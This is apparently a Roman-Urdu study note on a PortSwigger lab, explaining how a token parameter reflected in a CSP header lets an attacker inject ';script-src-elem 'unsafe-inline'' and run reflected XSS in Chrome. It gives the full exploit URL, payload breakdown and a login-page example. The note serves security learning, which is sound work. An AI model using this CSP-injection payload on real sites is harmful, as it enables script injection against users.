# 🚨 Lab: Reflected XSS protected by CSP, with CSP bypass (Urdu Style Full Note)

> ✅ **Goal:** XSS vulnerability ko exploit karna hai jahan **CSP lagi hui hai**, aur humein `alert(1)` chalana hai.
> ⚠️ **Special Condition:** Yeh attack sirf **Chrome browser** mein kaam karta hai.

---

## 🧠 Yeh lab kya sikhata hai?

Ye lab ek **Reflected XSS** vulnerability dikhata hai jo normal payloads se block ho rahi hai — **kyun?**  
Kyunkay site ne **Content Security Policy (CSP)** laga rakhi hai.

Lekin lab mein ek **token** parameter diya gaya hai jo CSP ke andar **reflect ho raha hai**.

Iska matlab:
> Hum token ke zariye CSP ke rules mein **apna naya rule inject** kar sakte hain!

---

## 🪜 Step-by-Step Hal:

### 🔹 Step 1: Payload test karo

Search box mein daalo:

```html
<img src=1 onerror=alert(1)>
````

**Natija:** Payload reflect ho raha hai lekin **chal nahi raha** — kyun?
❌ CSP ne block kar diya hai.

---

### 🔹 Step 2: CSP header observe karo (Burp Suite se)

Response headers mein yeh milega:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; report-uri=/csp-report?token=XYZ
```

👉 Yahan `token=XYZ` tumhara controlled parameter hai.
👉 Yeh `token` CSP ke andar reflect ho raha hai.
✅ Matlab: **CSP Injection possible hai!**

---

### 🔹 Step 3: CSP Inject karo aur XSS chalao

Final working payload URL:

```
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E&token=;script-src-elem%20'unsafe-inline'
```

### Payload Breakdown:

* `search=` → XSS payload (URL encoded): `<script>alert(1)</script>`
* `token=` → Injected CSP directive:

  ```
  ;script-src-elem 'unsafe-inline'
  ```

### Yeh kya karta hai?

* `;` → Pichla CSP rule todta hai.
* `script-src-elem 'unsafe-inline'` → Chrome ko keh raha hai: "inline `<script>` allowed hai".

✅ Result: `<script>alert(1)</script>` successfully execute ho gaya!

---

## 🔐 Real-Life Penetration Testing mein yeh technique kaise kaam aayegi?

### Scenario:

* Aapko XSS ka shak hai, lekin payload chal nahi raha.
* Response headers mein `Content-Security-Policy` laga hai.
* CSP ke andar koi parameter reflect ho raha hai (e.g., `token`, `ref`, `cb`).
* Aap us parameter mein **naya CSP rule inject** karte ho — jaise `script-src-elem 'unsafe-inline'`

✅ Agar payload chal gaya to **CSP successfully bypass ho gaya**.

---

## 🧪 Is lab ki khaas baat:

| Feature                           | Explanation                                                |
| --------------------------------- | ---------------------------------------------------------- |
| XSS Blocked by CSP                | Normal payloads block ho rahe hain                         |
| Reflected Parameter in CSP        | `token` CSP ke andar reflect ho raha hai                   |
| CSP Manipulation                  | `token` ke through naya directive inject kiya ja raha hai  |
| `script-src-elem 'unsafe-inline'` | Chrome sirf is directive se inline scripts allow karta hai |

---

## 🔥 Real-World Example:

### Example 1: Login Page

Ek login page CSP laga ke secure hai, lekin query string mein:

```
/login?token=user123
```

Server CSP header mein yeh daal raha hai:

```http
Content-Security-Policy: script-src 'self'; report-uri=/csp?token=user123
```

Attacker isko convert kar deta hai:

```
/login?token=;script-src-elem 'unsafe-inline'
```

✅ Boom! CSP break ho gayi, inline script allowed — XSS ho gaya.

---

## 📌 Analysis (Technical Detail):

| Cheez                | Jawab                                     |
| -------------------- | ----------------------------------------- |
| **Technique**        | Reflected XSS + CSP Bypass                |
| **Source**           | `location.search` (query param)           |
| **Sink**             | `<script>` tag (probably via `innerHTML`) |
| **Injection Point**  | `<script>...</script>` ke andar           |
| **Bypass Vector**    | `;script-src-elem 'unsafe-inline'`        |
| **Browser Specific** | Sirf Chrome par kaam karta hai            |

---

## 📚 Related Concepts:

| Term              | Meaning                                                  |
| ----------------- | -------------------------------------------------------- |
| CSP               | Browser-level rule system to block inline/malicious code |
| `unsafe-inline`   | Allow inline `<script>` execution                        |
| Reflected XSS     | Payload reflect hota hai from URL to response            |
| CSP Injection     | CSP header mein input inject karke rule badalna          |
| `script-src-elem` | Sirf `<script>` tags ke liye specific directive          |
| Burp Suite        | Tool to capture, modify and analyze HTTP traffic         |

---

## ✅ Final Summary

* CSP normally XSS block karti hai.
* Agar CSP ke andar koi parameter reflect ho raha ho (like `token`), to use inject karke inline script allow karwa sakte ho.
* Yeh technique rare hai lekin **critical** hoti hai.
* Sirf Chrome mein `script-src-elem 'unsafe-inline'` kaam karta hai.
* Real-life web apps mein agar aisi reflection mil jaye, to XSS bypass ho sakta hai.

---

**Filename:** `csp-xss-bypass-reflected-urdu.md`
**Tags:** `xss`, `reflected-xss`, `csp`, `csp-bypass`, `pentesting`, `chrome-only`, `urdu-notes`, `portswigger-labs`
